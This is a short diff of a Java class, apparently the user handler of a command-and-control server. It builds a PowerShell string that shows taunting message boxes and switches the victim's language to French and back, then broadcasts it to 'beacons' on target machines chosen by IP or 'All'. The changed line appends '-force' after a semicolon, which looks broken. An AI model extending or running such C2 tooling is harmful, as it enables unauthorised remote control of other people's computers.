@@ -330,7 +330,7 @@ public class C2ServerUserHandler implements Runnable{
                     commands += "[System.Windows.MessageBox]::Show('Have Fun Learning French MF');";
                     commands += "Start-Sleep -Seconds 60;";
                     commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
-                    commands += "Set-WinUserLanguageList en-US;";
+                    commands += "Set-WinUserLanguageList en-US; -force";
                     C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
                 } else if (userInput.equals("3")){
                     System.out.println("Enter IP address of individual target, or 'All' for all clients: ");
